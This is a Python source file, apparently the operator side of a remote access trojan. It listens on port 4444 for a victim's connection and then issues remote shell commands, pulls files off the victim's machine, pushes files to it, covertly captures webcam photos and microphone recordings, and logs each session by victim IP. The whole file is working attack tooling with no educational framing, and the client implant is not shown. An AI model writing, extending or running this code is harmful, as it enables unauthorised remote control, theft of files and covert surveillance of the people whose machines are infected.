import socket
import os
import time
end_re = "<end_of_result>"
chunk_size = 2048
eof = "<end_of_file>"
ser_soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ser_soc.bind(("192.168.10.101",4444))
ser_soc.listen(5)
print("ali watting to connection.............")
conn , ip = ser_soc.accept()
print("ip : ",ip)
from datetime import datetime

class SessionLogger:
    def __init__(self, ip_address):
       
        if not os.path.exists("logs"):
            os.makedirs("logs")
            
        current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.filename = f"logs/log_{ip_address}_{current_time}.txt"
        
        self.write_entry(f"--- Started Session with {ip_address} ---")

    def write_entry(self, message):
        
        timestamp = datetime.now().strftime("[%H:%M:%S]")
        try:
            with open(self.filename, "a", encoding="utf-8") as f:
                f.write(f"{timestamp} {message}\n")
        except Exception as e:
            print(f"Error logging: {e}")

    def log_command(self, command):
        
        self.write_entry(f"[COMMAND SENT]: {command}")

    def log_result(self, action_type, status):
       
        self.write_entry(f"[RESULT - {action_type}]: {status}")


logger = SessionLogger(ip)
try:
    
    
    while True:

        command = input("> ")
        conn.send(command.encode())
        logger.log_command(command)
        
        if command.lower() == "stop":
            conn.close()
            ser_soc.close()
            break

        elif command == "":
            continue
        
        elif command.startswith("cd"):  
            path = conn.recv(1024).decode("cp1256")
            logger.log_result("change working dir to ",path)
            # print(path)
            continue
        
        elif command.startswith("download"): 
            exists = conn.recv(1024)
            if exists.decode("cp1256") == "yes":
                logger.log_result("is exist this file","right")
                file_name = command.strip("download ")
                with open(file_name, "wb") as download_file:
                    print("wait Downloading file.......")

                    while True:
                        chunk = conn.recv(chunk_size)

                        if chunk.endswith(eof.encode("cp1256")):
                            chunk = chunk[:-len(eof)]
                            download_file.write(chunk)
                            break
                        download_file.write(chunk)
                print("Successfully downloaded, ", file_name)
                logger.log_result("File Download", f"Downloaded {file_name} successfully")

            else:
                print("File doesn't exist")
                logger.log_result("File Download", f"Downloaded {file_name} falled")


        elif command.startswith("take photo"):
            data = conn.recv(1024).decode()
            if data == "yes":
                logger.log_result("he open his camare","right")
                file_name = "photo.jpg"
                with open(file_name, "wb") as download_file:
                    print("wait Downloading photo.......")

                    while True:
                        chunk = conn.recv(chunk_size)

                        if chunk.endswith(eof.encode()):
                            chunk = chunk[:-len(eof)]
                            download_file.write(chunk)
                            break
                        download_file.write(chunk)
                print("Successfully i take it, ", file_name)
                logger.log_result("Camera", "Photo taken successfully")
            else:
                data = conn.recv(1024).decode()
                print(data)
                logger.log_result("Camera", "Photo taken falled")

        elif command.startswith("start record"):
            data = conn.recv(1024).decode()
            if data == "yes":
                file_name = "audio.wav"
                with open(file_name, "wb") as download_file:
                    print("wait Downloading audio.......")

                    while True:
                        chunk = conn.recv(chunk_size)

                        if chunk.endswith(eof.encode("cp1256")):
                            chunk = chunk[:-len(eof)]
                            download_file.write(chunk)
                            break
                        download_file.write(chunk)
                print("Successfully i take it, ", file_name)
                logger.log_result("Micrphone", "voice taken successfully")
            else:
                data = conn.recv(1024).decode()
                print(data)
                logger.log_result("Micrphone", "voice taken falled")
                


        elif command.startswith("upload"):
            file_to_upload = command.strip("upload ")
            if os.path.exists(file_to_upload) :
                exists = "yes"
                conn.send(exists.encode())
                answer = conn.recv(1024)
                if answer.decode() == "yes":                 
                    with open(file_to_upload, "rb") as file:
                        chunk = file.read(chunk_size)
                        print("Uploading FIle ... ")
                        while len(chunk) > 0:
                            conn.send(chunk)
                            chunk = file.read(2048)
                        conn.send(eof.encode("cp1256"))
                    print("File sent successfully")
                    logger.log_result("File UPLOAD", f"upload successfully")
                
            else:
                exists = "no"
                print("File doesn't exist")
                conn.send(exists.encode())
                logger.log_result("File UPLOAD", f"upload  falled")
                continue

        else:
            full_r = bytes()
            while True:
                pace = conn.recv(1024)

                if pace.endswith(end_re.encode("cp1256")):
                    pace = pace[:-len(end_re)]
                    full_r += pace
                    print(full_r.decode("cp1256"))
                    logger.log_result("Shell Output",full_r.decode("cp1256"))
                    break

                else:
                    full_r += pace
            

except Exception:
    print("maybe disconnect ")
    




